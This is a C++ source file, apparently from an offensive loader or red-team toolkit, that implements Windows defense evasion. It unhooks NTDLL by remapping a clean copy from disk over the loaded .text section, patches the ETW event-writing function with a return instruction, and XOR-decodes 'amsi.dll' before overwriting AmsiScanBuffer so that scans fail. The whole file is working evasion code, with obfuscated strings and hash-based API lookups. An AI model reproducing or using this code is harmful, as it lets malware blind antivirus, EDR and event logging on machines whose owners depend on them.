#include "../include/Evasion.h"
#include <iostream>

VOID sdGetUnhookApi(UnhookApi* API, PVOID hNtdll) {
	API->NtProtectVirtualMemory = (fn_NtProtectVirtualMemory)sdGetProcAddress(hNtdll, NT_VIRTUAL_PROTECT);
	API->NtCreateFile = (fn_NtCreateFile)sdGetProcAddress(hNtdll, NT_CREATE_FILE);
	API->NtCreateSection = (fn_NtCreateSection)sdGetProcAddress(hNtdll, NT_CREATE_SECTION);
	API->NtMapViewOfSection = (fn_NtMapViewOfSection)sdGetProcAddress(hNtdll, NT_MAP_SECTION_VIEW);
	API->NtUnmapViewOfSection = (fn_NtUnmapViewOfSection)sdGetProcAddress(hNtdll, NT_UNMAP_SECTION_VIEW);
	API->NtClose = (fn_NtClose)sdGetProcAddress(hNtdll, NT_CLOSE);
}

BOOL sdUnhookDll(ULONG Hash, PVOID ModuleBase) {
	// PE STUFF
	PIMAGE_DOS_HEADER Dos = (PIMAGE_DOS_HEADER)(ModuleBase);
	PIMAGE_NT_HEADERS NtH = (PIMAGE_NT_HEADERS)((DWORD_PTR)ModuleBase + Dos->e_lfanew);
	PIMAGE_SECTION_HEADER SctH = IMAGE_FIRST_SECTION(NtH);
	// NTAPI STUFF
	SIZE_T szSizeText = 0;
	DWORD dwOldProtect = 0;
	LPVOID pText = nullptr;
	HANDLE hFile = nullptr;
	HANDLE hSection = nullptr;
	PVOID pMapping = nullptr;
	OBJECT_ATTRIBUTES oa{};
	IO_STATUS_BLOCK ioStatus;
	SIZE_T viewSize = 0;
	// STRING STUFF
	PUNICODE_STRING ModuleName = nullptr;
	UNICODE_STRING prefixPath = {};
	WCHAR fullPathBuffer[MAX_PATH] = {};
	CONST WCHAR* prefix = L"\\??\\";
	SIZE_T szPrefix = 0;
	SIZE_T szPath = 0;
	// NTAPI RESOLUTION
	PVOID hNtdll = nullptr;
	UnhookApi API{};
	NTSTATUS status = 0;

	hNtdll = sdGetModuleHandle(NTDLL);
	sdGetUnhookApi(&API, hNtdll);

	ModuleName = sdGetModuleName(Hash);
	szPrefix = sdStringLengthW(prefix);
	szPath = sdStringLengthW(ModuleName->Buffer);
	if ((szPrefix + szPath) >= MAX_PATH) {
		return FALSE;
	}

	sdStringCopyW(fullPathBuffer, prefix);
	sdStringConcatW(fullPathBuffer, ModuleName->Buffer);

	sdRtlInitUnicodeString(&prefixPath, fullPathBuffer);

	InitializeObjectAttributes(&oa, &prefixPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

	status = API.NtCreateFile(&hFile, GENERIC_READ, &oa, &ioStatus, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE, 0, 0);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}

	status = API.NtCreateSection(&hSection, SECTION_MAP_READ, NULL, NULL, PAGE_READONLY, SEC_COMMIT, hFile);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}

	status = API.NtMapViewOfSection(hSection, ((HANDLE)-1), &pMapping, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READONLY);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}

	pText = sdFindText(&szSizeText, SctH, ModuleBase);

	szSizeText = SctH->Misc.VirtualSize;
	status = API.NtProtectVirtualMemory(((HANDLE)-1), &pText, &szSizeText, PAGE_EXECUTE_READWRITE, &dwOldProtect);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}

	__builtin_memcpy(
		(LPVOID)((DWORD_PTR)ModuleBase + (DWORD_PTR)SctH->VirtualAddress),
		(LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)SctH->VirtualAddress),
		szSizeText
	);

	status = API.NtProtectVirtualMemory(((HANDLE)-1), &pText, &szSizeText, dwOldProtect, &dwOldProtect);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}

	status = API.NtUnmapViewOfSection(((HANDLE)-1), pMapping);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}
	status = API.NtClose(hFile);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}
	status = API.NtClose(hSection);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}
	return TRUE;
}

BOOL sdPatchEtw(PVOID hNtdll) {
	fn_NtProtectVirtualMemory NtProtectVirtualMemory = (fn_NtProtectVirtualMemory)sdGetProcAddress(hNtdll, NT_VIRTUAL_PROTECT);
	NTSTATUS status = 0;
	DWORD dwOldProtect = 0;
	PBYTE pbPatchMe = nullptr;
	BYTE bPatch = 0xC3;
	SIZE_T szPatch = 1;

	pbPatchMe = (PBYTE)sdGetProcAddress(hNtdll, NT_TRACE_EVENT);

	status = NtProtectVirtualMemory(((HANDLE)-1), (PVOID*)&pbPatchMe, &szPatch, PAGE_EXECUTE_READWRITE, &dwOldProtect);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}
	// we add 0x8f0 because the call aligns the address and thus overwrites our pointer :P
	__builtin_memcpy((PVOID)(pbPatchMe + 0x8f0), &bPatch, 1); 
	status = NtProtectVirtualMemory(((HANDLE)-1), (PVOID*)&pbPatchMe, &szPatch, dwOldProtect, &dwOldProtect);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}
	return TRUE;
}

VOID _Xor(PCHAR pBuffer, INT iLen, INT iKey, INT iCounter) {
	if (iCounter < iLen) {
		pBuffer[iCounter] ^= iKey;
		iKey ^= iCounter;
		_Xor(pBuffer, iLen, iKey, iCounter + 1);
	}
}

VOID Xor(PCHAR pBuffer, INT iLen) {
	_Xor(pBuffer, iLen, 0x40, 0);
}

BOOL sdPatchAmsi(PVOID hNtdll) {
	fn_LdrLoadDll LdrLoadDll = nullptr;
	fn_NtProtectVirtualMemory NtProtectVirtualMemory = nullptr;
	NTSTATUS status = 0;
	BYTE buff[] = {0x21, 0x2d, 0x32, 0x2a, 0x6e, 0x20, 0x2d, 0x2b};
	WCHAR wcDecrypted[9] = {};
	UNICODE_STRING ustrDll = {};
	PVOID hAmsi = nullptr;
	PBYTE pbPatchMe = nullptr;
	PBYTE pbCopy = nullptr;
	SIZE_T size = 6;
	DWORD dwOldProtect = 0;
	BYTE bPatch[] = { 0xBB, 0x57, 0x00, 0x07, 0x80, 0xC3 };


	Xor((PCHAR)&buff, 8);
	sdByteArrayToCharArrayW((PWCHAR)&wcDecrypted, (PBYTE)&buff, 8);
	sdRtlInitUnicodeString(&ustrDll, wcDecrypted);

	// load amsi.dll
	LdrLoadDll = (fn_LdrLoadDll)sdGetProcAddress(hNtdll, LDR_GET_DLL);
	status = LdrLoadDll(0, 0, &ustrDll, &hAmsi);
	if (status != STATUS_SUCCESS && status != STATUS_IMAGE_ALREADY_LOADED) {
		return FALSE;
	}
	
	// get AmsiScanBuffer
	pbPatchMe = (PBYTE)sdGetProcAddress(hAmsi, AMSI_SCAN_BUFF);
	pbCopy = pbPatchMe;

	// patch
	NtProtectVirtualMemory = (fn_NtProtectVirtualMemory)sdGetProcAddress(hNtdll, NT_VIRTUAL_PROTECT);
	status = NtProtectVirtualMemory(((HANDLE)-1), (PVOID*)&pbCopy, &size, PAGE_EXECUTE_READWRITE, &dwOldProtect);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}
	__builtin_memcpy(pbPatchMe, &bPatch, 6);
	status = NtProtectVirtualMemory(((HANDLE)-1), (PVOID*)&pbCopy, &size, dwOldProtect, &dwOldProtect);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}

	return TRUE;
}